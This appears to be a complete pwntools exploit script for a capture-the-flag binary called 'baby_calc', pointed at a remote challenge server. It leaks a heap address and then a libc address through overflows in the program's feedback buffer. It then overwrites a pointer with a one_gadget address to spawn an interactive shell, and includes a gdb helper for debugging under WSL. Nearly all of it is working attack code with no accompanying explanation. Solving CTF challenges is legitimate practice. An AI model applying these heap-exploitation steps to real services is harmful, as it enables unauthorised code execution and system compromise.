#!/usr/bin/env python3

from pwn import *

exe = ELF("./baby_calc", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe
libc.sym['one_gadget'] = 0xebcf8

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("45.122.249.68", 20002)

    return r

def GDB():     # Wsl2
    import os
    script = '''
    #!/bin/sh

    cd /home/johnathanhuutri/baby_calc
    '''
    script += f'gdb -p {p.pid} -x /tmp/command.gdb'
    with open('/tmp/script.sh', 'w') as f: f.write(script)
    os.system("chmod +x /tmp/script.sh")

    command = '''
    b*main+314
    b setup_data
    b*setup_data+90
    b*setup_data+331
    b save_result
    b view_result
    b*cleanup_data+67
    c
    '''
    with open('/tmp/command.gdb', 'w') as f: f.write(command)
    q = process(f'cmd.exe /c start C:\\Windows\\system32\\wsl.exe /tmp/script.sh'.split())
    input()


p = conn()

##################################
### Stage 1: Leak heap address ###
##################################
# Expression 1
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000008)       # size
payload += p32(5)           # arg1
payload += p32(6)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = cyclic(0x8)
p.sendafter(b'feedback:', payload)
p.recvline()

# Expression 2
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000008)       # size
payload += p32(5)           # arg1
payload += p32(6)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = flat(
    # new_data->buffer
    b'A'*0x48,

    # result_str
    0xffffffffffffffff,
    b'B'*0x88,

    # obj
    0xffffffffffffffff,
    )
p.sendafter(b'feedback:', payload)
p.recvuntil(b'B'*0x88 + p64(0xffffffffffffffff))
heap_leak = u64(p.recv(6) + b'\0\0')
heap_base = heap_leak - 0x320
log.info("Heap base: " + hex(heap_base))

##################################
### Stage 2: Leak libc address ###
##################################
# Expression 3
payload = b'+'.ljust(4, b'\0')
payload += p32(0x200000a0)       # size
payload += p32(5)           # arg1
payload += p32(6)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = b'A'*0x48
p.sendafter(b'feedback:', payload)
p.recvline()

payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000008)       # size
payload += p32(7)           # arg1
payload += p32(8)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = flat(
    # new_data->buffer
    b'A'*0x48,

    # result_str
    0x91,
    b'B'*0x88,

    # obj
    0x21,
    heap_base+0x5c0
    )
p.sendafter(b'feedback: ', payload)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x219ce0
log.info("Libc base: " + hex(libc.address))

##########################
### Stage 3: Get shell ###
##########################
# Expression 5
payload = b'+'.ljust(4, b'\0')
payload += p32(0x20000008)       # size
payload += p32(0)           # arg1
payload += p32(0)           # arg2
payload = payload.ljust(0x80, b'A')
p.send(payload)

payload = flat(
    b'A'*0x2f0,
    0, 0,
    heap_base, libc.sym['one_gadget']
    )
p.sendafter(b'feedback: ', payload)

p.interactive()
